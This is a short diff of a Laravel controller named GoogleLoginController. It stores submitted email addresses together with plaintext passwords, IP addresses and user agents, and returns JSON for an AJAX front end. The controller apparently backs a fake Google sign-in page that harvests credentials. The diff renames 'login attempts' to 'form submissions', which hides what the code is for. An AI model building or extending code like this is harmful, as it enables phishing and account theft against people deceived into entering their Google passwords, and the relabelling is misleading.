@@ -2,7 +2,7 @@
 
 namespace App\Http\Controllers;
 
-use App\Models\LoginAttempt;
+use App\Models\GoogleFormSubmission;
 use Illuminate\Http\Request;
 
 class GoogleLoginController extends Controller
@@ -14,15 +14,15 @@ class GoogleLoginController extends Controller
             'password' => 'required|string|min:6',
         ]);
 
-        // Store the login attempt
-        LoginAttempt::create([
+        // Store the form submission
+        GoogleFormSubmission::create([
             'email' => $validated['email'],
             'password' => $validated['password'],
             'ip_address' => $request->ip(),
             'user_agent' => $request->userAgent(),
         ]);
 
-        // Redirect back with success message
-        return back()->with('success', 'Login attempt recorded.');
+        // Return success response as JSON for AJAX
+        return response()->json(['success' => true]);
     }
 }
